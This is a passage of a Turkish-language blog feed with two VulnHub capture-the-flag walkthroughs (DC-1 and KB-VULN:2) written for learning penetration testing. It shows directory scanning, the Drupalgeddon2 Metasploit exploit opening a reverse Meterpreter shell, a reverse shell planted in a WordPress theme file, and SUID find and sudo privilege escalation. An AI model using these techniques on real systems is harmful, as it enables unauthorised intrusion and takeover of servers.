/.svn/entries <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.svn <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.subversion <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.ssh <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.listing <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.sh_history <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.web <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.swf <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/.htaccess <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/0 <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/admin <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/Admin <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/ADMIN <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/batch <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/cgi-bin/ <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/Entries <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/includes <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/index.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/install.mysql <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/install.pgsql <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/LICENSE <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/misc <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/modules <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/node <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/profiles <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/README <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/robots <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/robots.txt <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/Root <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/scripts <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/search <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/Search <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/server-status <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span>
/sites <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/themes <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
/user <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/web.config <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
/xmlrpc.php <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span>
<span style="color:#f92672">===============================================================</span>
2020/09/24 10:13:18 Finished
<span style="color:#f92672">===============================================================</span>
</code></pre></div><p>İlk olarak robots.txt dosyasına göz gezdirilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">User-agent: *
Crawl-delay: 10
# Directories
Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/
# Files
Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php
# Paths (clean URLs)
Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/
# Paths (no clean URLs)
Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
</code></pre></div><p><strong>/?p=</strong> parametresi LFI, RFI açıklarının olabileceğini düşündürmektedir. Yapılan denemelerde başarılı olunamamıştır. <em><strong>web.config</strong></em> dikkat çekmektedir. İstek atıldığında xml verisi görülmektedir. LFI ve RFI gibi saldırıları önlemek için epey bir önlem alındığı görülmektedir. 😔</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-xml" data-lang="xml"><span style="color:#f92672">&lt;configuration&gt;</span>
<span style="color:#f92672">&lt;system.webServer&gt;</span>
<span style="color:#75715e">&lt;!--
</span><span style="color:#75715e"> Don&#39;t show directory listings for URLs which map to a directory. 
</span><span style="color:#75715e">--&gt;</span>
<span style="color:#f92672">&lt;directoryBrowse</span> <span style="color:#a6e22e">enabled=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;rewrite&gt;</span>
<span style="color:#f92672">&lt;rules&gt;</span>
<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Protect files and directories from prying eyes&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|file*|Repository|Root|Tag|Template)$&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;CustomResponse&#34;</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;403&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;0&#34;</span> <span style="color:#a6e22e">statusReason=</span><span style="color:#e6db74">&#34;Forbidden&#34;</span> <span style="color:#a6e22e">statusDescription=</span><span style="color:#e6db74">&#34;Access is forbidden.&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/rule&gt;</span>
<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Force simple error message for requests for non-existent favicon.ico&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;favicon\.ico&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;CustomResponse&#34;</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;1&#34;</span> <span style="color:#a6e22e">statusReason=</span><span style="color:#e6db74">&#34;File Not Found&#34;</span> <span style="color:#a6e22e">statusDescription=</span><span style="color:#e6db74">&#34;The requested file favicon.ico was not found&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;conditions&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsFile&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/conditions&gt;</span>
<span style="color:#f92672">&lt;/rule&gt;</span>
<span style="color:#75715e">&lt;!--
</span><span style="color:#75715e"> Rewrite URLs of the form &#39;x&#39; to the form &#39;index.php?q=x&#39;. 
</span><span style="color:#75715e">--&gt;</span>
<span style="color:#f92672">&lt;rule</span> <span style="color:#a6e22e">name=</span><span style="color:#e6db74">&#34;Short URLs&#34;</span> <span style="color:#a6e22e">stopProcessing=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">&gt;</span>
<span style="color:#f92672">&lt;match</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;^(.*)$&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;conditions&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsFile&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{REQUEST_FILENAME}&#34;</span> <span style="color:#a6e22e">matchType=</span><span style="color:#e6db74">&#34;IsDirectory&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">input=</span><span style="color:#e6db74">&#34;{URL}&#34;</span> <span style="color:#a6e22e">pattern=</span><span style="color:#e6db74">&#34;^/favicon.ico$&#34;</span> <span style="color:#a6e22e">ignoreCase=</span><span style="color:#e6db74">&#34;false&#34;</span> <span style="color:#a6e22e">negate=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/conditions&gt;</span>
<span style="color:#f92672">&lt;action</span> <span style="color:#a6e22e">type=</span><span style="color:#e6db74">&#34;Rewrite&#34;</span> <span style="color:#a6e22e">url=</span><span style="color:#e6db74">&#34;index.php?q={R:1}&#34;</span> <span style="color:#a6e22e">appendQueryString=</span><span style="color:#e6db74">&#34;true&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/rule&gt;</span>
<span style="color:#f92672">&lt;/rules&gt;</span>
<span style="color:#f92672">&lt;/rewrite&gt;</span>
<span style="color:#f92672">&lt;httpErrors&gt;</span>
<span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">subStatusCode=</span><span style="color:#e6db74">&#34;-1&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;error</span> <span style="color:#a6e22e">statusCode=</span><span style="color:#e6db74">&#34;404&#34;</span> <span style="color:#a6e22e">prefixLanguageFilePath=</span><span style="color:#e6db74">&#34;&#34;</span> <span style="color:#a6e22e">path=</span><span style="color:#e6db74">&#34;/index.php&#34;</span> <span style="color:#a6e22e">responseMode=</span><span style="color:#e6db74">&#34;ExecuteURL&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/httpErrors&gt;</span>
<span style="color:#f92672">&lt;defaultDocument&gt;</span>
<span style="color:#75715e">&lt;!-- Set the default document --&gt;</span>
<span style="color:#f92672">&lt;files&gt;</span>
<span style="color:#f92672">&lt;remove</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;add</span> <span style="color:#a6e22e">value=</span><span style="color:#e6db74">&#34;index.php&#34;</span><span style="color:#f92672">/&gt;</span>
<span style="color:#f92672">&lt;/files&gt;</span>
<span style="color:#f92672">&lt;/defaultDocument&gt;</span>
<span style="color:#f92672">&lt;/system.webServer&gt;</span>
<span style="color:#f92672">&lt;/configuration&gt;</span>
</code></pre></div><p>Google&rsquo;da yapılan aramalarda CMS sürümünün eski olduğu tespit edilmiştir. Yapılan aramalarda <em>CVE-2018-7600</em> kodlu &lsquo;Drupalgeddon2&rsquo; adında  RCE (Remote Code Execution) exploiti tespit edilir.(Exploitdb de yer alan exploit indirilip kullanılabilmektedir. Ben burada metasploit üzerinde exploit etme işlemi gerçekleştirdim.)</p>
<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msfconsole -q
</code></pre></div><p>Metasploit açılır ve search komutu ile dropal ile ilgili arama gerçekleştirilir. Aynı exploit metasploit içerisinde yer almaktadır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; search drupal

Matching Modules
<span style="color:#f92672">================</span>

   <span style="color:#75715e">#  Name                                           Disclosure Date  Rank       Check  Description</span>
   -  ----                                           ---------------  ----       -----  -----------
   <span style="color:#ae81ff">0</span>  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
   <span style="color:#ae81ff">1</span>  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
   <span style="color:#ae81ff">2</span>  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
   <span style="color:#ae81ff">3</span>  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
   <span style="color:#ae81ff">4</span>  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon <span style="color:#ae81ff">2</span> Forms API Property Injection
   <span style="color:#ae81ff">5</span>  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
   <span style="color:#ae81ff">6</span>  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize<span style="color:#f92672">()</span> RCE
   <span style="color:#ae81ff">7</span>  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">options <span style="color:#75715e">#exploit kullanımı için gerekli parametler görüntülenir</span>
set paramatre değer <span style="color:#75715e">#parametreye değer set edilir.</span>
exploit/run  <span style="color:#75715e">#exploit çalıştırılır.</span>
</code></pre></div><p>Dördüncü sırada yer alan exploit seçilir gerekli parametler ayarlamalar yapıldıktından sonra exploit/run komutu ile çalıştırılır ve meterpreter oturumu elde edilir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">msf5 &gt; use <span style="color:#ae81ff">4</span>
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/drupal_drupalgeddon2<span style="color:#f92672">)</span> &gt; set RHOSTS 192.168.56.107
RHOSTS <span style="color:#f92672">=</span>&gt; 192.168.56.107
msf5 exploit<span style="color:#f92672">(</span>unix/webapp/drupal_drupalgeddon2<span style="color:#f92672">)</span> &gt; exploit

<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 192.168.56.105:4444 
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">38288</span> bytes<span style="color:#f92672">)</span> to 192.168.56.107
<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>192.168.56.105:4444 -&gt; 192.168.56.107:40386<span style="color:#f92672">)</span> at 2020-09-24 12:16:50 -0500
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">meterpreter &gt; getuid
Server username: www-data <span style="color:#f92672">(</span>33<span style="color:#f92672">)</span>

meterpreter &gt; ls
Listing: /var/www
<span style="color:#f92672">=================</span>

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100644/rw-r--r--  <span style="color:#ae81ff">174</span>    fil   2013-11-20 14:45:59 -0600  .gitignore
100644/rw-r--r--  <span style="color:#ae81ff">5767</span>   fil   2013-11-20 14:45:59 -0600  .htaccess
100644/rw-r--r--  <span style="color:#ae81ff">1481</span>   fil   2013-11-20 14:45:59 -0600  COPYRIGHT.txt
100644/rw-r--r--  <span style="color:#ae81ff">1451</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.mysql.txt
100644/rw-r--r--  <span style="color:#ae81ff">1874</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.pgsql.txt
100644/rw-r--r--  <span style="color:#ae81ff">1298</span>   fil   2013-11-20 14:45:59 -0600  INSTALL.sqlite.txt
100644/rw-r--r--  <span style="color:#ae81ff">17861</span>  fil   2013-11-20 14:45:59 -0600  INSTALL.txt
100755/rwxr-xr-x  <span style="color:#ae81ff">18092</span>  fil   2013-11-01 05:14:15 -0500  LICENSE.txt
100644/rw-r--r--  <span style="color:#ae81ff">8191</span>   fil   2013-11-20 14:45:59 -0600  MAINTAINERS.txt
100644/rw-r--r--  <span style="color:#ae81ff">5376</span>   fil   2013-11-20 14:45:59 -0600  README.txt
100644/rw-r--r--  <span style="color:#ae81ff">9642</span>   fil   2013-11-20 14:45:59 -0600  UPGRADE.txt
100644/rw-r--r--  <span style="color:#ae81ff">6604</span>   fil   2013-11-20 14:45:59 -0600  authorize.php
100644/rw-r--r--  <span style="color:#ae81ff">720</span>    fil   2013-11-20 14:45:59 -0600  cron.php
100644/rw-r--r--  <span style="color:#ae81ff">52</span>     fil   2019-02-19 07:20:46 -0600  flag1.txt
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  includes
100644/rw-r--r--  <span style="color:#ae81ff">529</span>    fil   2013-11-20 14:45:59 -0600  index.php
100644/rw-r--r--  <span style="color:#ae81ff">703</span>    fil   2013-11-20 14:45:59 -0600  install.php
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  misc
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  modules
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  profiles
100644/rw-r--r--  <span style="color:#ae81ff">1561</span>   fil   2013-11-20 14:45:59 -0600  robots.txt
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  scripts
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  sites
40755/rwxr-xr-x   <span style="color:#ae81ff">4096</span>   dir   2013-11-20 14:45:59 -0600  themes
100644/rw-r--r--  <span style="color:#ae81ff">19941</span>  fil   2013-11-20 14:45:59 -0600  update.php
100644/rw-r--r--  <span style="color:#ae81ff">2178</span>   fil   2013-11-20 14:45:59 -0600  web.config
100644/rw-r--r--  <span style="color:#ae81ff">417</span>    fil   2013-11-20 14:45:59 -0600  xmlrpc.php
</code></pre></div><p><code>shell</code> komutu ile normal oturuma geçilir. Daha sonra interaktif oturum için python pty modulü kullanılır. Daha sonra flag1.txt okunur. <em>(Meterpreter oturumu ile devam edilebilir ben kullanmayı sevmediğimden normal shelle geçiyorum.)</em></p>

    <img src="/images/vulnhub/dc1/flag1.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>Home dizinine geçilerek diğer kullanılar tespit edilir. Flag4 adında bir kullanıcı dizini yer almaktadır. Dizin yetkilerine bakıldığında tüm kullanıcılar için okuma ve çalıştırma yetkileri bulunmaktadır.</p>

    <img src="/images/vulnhub/dc1/flag43.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<p>Dizin içerisinde yer alan flag4.txt okunur.</p>

    <img src="/images/vulnhub/dc1/flag44.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Sistem suid biti aktif olan dosyalar için arama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@DC-1:/$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null

/bin/mount
/bin/ping
/bin/su
/bin/ping6
/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/procmail
/usr/bin/find
/usr/sbin/exim4
/usr/lib/pt_chown
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/sbin/mount.nfs
www-data@DC-1:/$ 
</code></pre></div><p>find komutu dikkat çekmektedir. find komutu -exec parametresi ile komut çalıştırabilmektedir.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -exec /bin/sh <span style="color:#ae81ff">\;</span> -quit
</code></pre></div><p>Komut çalıştırıldıktan sonra www-data kullanıcısının efektif user id değeri ve grubunun root olarak set edildiği görülmektedir. Daha sonra /root dizinine gidilerek flag edeği okunarak makina çözümlemesi tamamlanır.</p>

    <img src="/images/vulnhub/dc1/flagson.png"  alt="Hay aksi"  class="center"  style="border-radius: 8px;"  />


]]></content>
        </item>
        
        <item>
            <title>VULN KB VULN:2 Write Up</title>
            <link>https://barcode91.github.io/posts/2020/09/vuln-kb-vuln2-write-up/</link>
            <pubDate>Fri, 25 Sep 2020 20:01:07 +0300</pubDate>
            
            <guid>https://barcode91.github.io/posts/2020/09/vuln-kb-vuln2-write-up/</guid>
            <description>Merhaba, Bu yazımda sizlere VULNHUB &amp;lsquo;da yer alan KB-VULN: 2 adlı makinanın çözümünden bahsedeceğim. Makina için KernelBlog ekibine teşekkür ederim. Keyifli okumalar&amp;hellip;
1. Keşif Aşaması Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.
netdiscover -i eth0  Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</description>
            <content type="html"><![CDATA[<p>Merhaba, Bu yazımda sizlere <a href="https://www.vulnhub.com/entry/kb-vuln-2,562/">VULNHUB</a> &lsquo;da yer alan KB-VULN: 2 adlı makinanın çözümünden bahsedeceğim. Makina için <a href="https://kernelblog.org">KernelBlog</a> ekibine teşekkür ederim. Keyifli okumalar&hellip;</p>
<h2 id="1-keşif-aşaması">1. Keşif Aşaması</h2>
<p>Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">netdiscover -i eth0
</code></pre></div>
    <img src="/images/vulnhub/kb-vuln2/netdiscover.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Ip adresi tespit edildikten sonra nmap ile makinenin açık portları ve portlarda çalışan servisleri tespit edilir.</p>

    <img src="/images/vulnhub/kb-vuln2/nmap.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Tarayıcı ile istek atıldığında Apache Web server varsayılan sayfası açılmaktadır. Web dizin taraması gerçekleştirilir.</p>
<pre><code class="language-terminal" data-lang="terminal">gobuster dir -u http://192.168.56.108/ -w /usr/share/wordlists/dirb/big.txt
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/gobuster.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><em><strong>/wordpress</strong></em> dizinine istek atıdığında anasayfanın düzgün görüntülenmediği tespit edilir. /etc/hosts dosyasına <code>192.168.56.108  kb.vuln</code> eklenir ve yenilenir. Sayfa kaynak kodları incelenir. Herhangi bir bilgiye rastlanmaz.</p>

    <img src="/images/vulnhub/kb-vuln2/webpage.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Daha sonra Wordpress CMS dizininde tarama gerçekleştirilir. Standart wordpress dosyaları dışında ilave bir bilgi görülmemektedir.</p>
<pre><code class="language-terminal" data-lang="terminal">gobuster dir -u http://192.168.56.108/wordpress -w /usr/share/wordlists/dirb/big.txt
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/gobuster2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Nmap taramasında tespit edilen 445 ve 139 numaralı portlarda çalışan samba uygulaması için (SMB Servisi) için <em><strong>smbclient</strong></em> adlı yazılım ile enumeration yapılır.</p>
<pre><code class="language-terminal" data-lang="terminal">smbclient -L ///192.168.56.108
# -L parametresi ağda paylaşılan dosyları listeler
# Username '', Password '' (Anonim Erişim)
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/smb1.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Anonymous adlı klasöre şifresiz erişim sağlanabilmektedir. Ayrıca Linux makinalarda samba servisine <em><strong>enum4linux</strong></em> aracı ile tarama işlemi gerçekleştirilebilmektedir. Erişime açık olan klasöre bağlantı sağlanır. ls komutu ile dizin listelenir.</p>
<pre><code class="language-terminal" data-lang="terminal">smbclient \\\\192.168.56.108\\Anonymous
</code></pre>
    <img src="/images/vulnhub/kb-vuln2/smb2.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Bir yedek dosyasının şifresiz bir şekilde paylaşıma açıldığı görülmektedir. Dosya get komutu ile indirilir ve arşiv dosyası açılır. Dosya içerisinde çalışan wordpress uygulmasına ait dosyalar ve bir adet remember_me.txt dosya yer almaktadır.</p>

    <img src="/images/vulnhub/kb-vuln2/pass.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Admin kullanıcısına ait parola bilgisi görülmektedir. Wordpress admin paneline giriş yapılır. Daha sonra shell bağlantısı yapmak için tema dosyalarında düzenleme yapılır. Bu işlem için <em><strong>Appearance -&gt; Theme Editor</strong></em> sekmeleri tıklanır. Açılan sayfada tema secilir. Sağ sütunda php sayfaları yer almaktadır. Ben genelde 404.php dosyasında değişiklik yapmaktayım.</p>

    <img src="/images/vulnhub/kb-vuln2/shell.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="2-erişim-sağlanması">2. Erişim Sağlanması</h2>
<pre><code class="language-url" data-lang="url">http://kb.vuln/wordpress/wp-content/themes/twentynineteen/404.php
</code></pre><p>Netcat ile 4444 numaralı port dinlenir. Yukarıda yer alan adrese istek atıldığında <strong>www-data</strong> kullanıcısı ile terminal bağlantısı sağlanmış olur.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Komutu ile interaktif shelle geçilir. Home dizinine gidilerek kullanıcılar listelenir.</p>

    <img src="/images/vulnhub/kb-vuln2/home.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p><strong>Kbadmin</strong> klasör yetkilerine dikkat edildiğinde tüm kullanıcılar tarafında okuma ve çalıştırma yetkisi verildiği görülmektedir. Dizin içerisine girilir.</p>

    <img src="/images/vulnhub/kb-vuln2/preflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>User.txt değeri okunarak ilk flag elde edilir.</p>

    <img src="/images/vulnhub/kb-vuln2/userflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<h2 id="3-yetki-yükseltme">3. Yetki Yükseltme</h2>
<p>Kbadmin dizininde yer alan note.txt dosyası okunur. Yetki yükseltilmesi ile ilgili docker kullanılması yönünde bir ipucu olabilir.</p>

    <img src="/images/vulnhub/kb-vuln2/note.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>İlk olarak wordpress admin panelinde elde edilen parola kbadmin kullanıcısı için denenir.  <code>su kbadmin</code> Başarılı bir şekilde kbadmin kullanıcısı ile oturum açılır. 🙈  <code>sudo -l</code> komutu ile kullanıcı yetkileri kontrol edilir.</p>

    <img src="/images/vulnhub/kb-vuln2/sudo.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


<p>Kbadmin kullanıcısına sudo işlemlerinde parola girmek şartıyla sınırsız yetki verildiği görülmektedir. <code>sudo su</code> komutu ile root kullanıcısına geçilir. /root dizinine geçilerek flag değeri okunur.</p>

    <img src="/images/vulnhub/kb-vuln2/rootflag.png"  alt="Hay aksi"  class="center"  style="border-radius: 10px;"  />


]]></content>
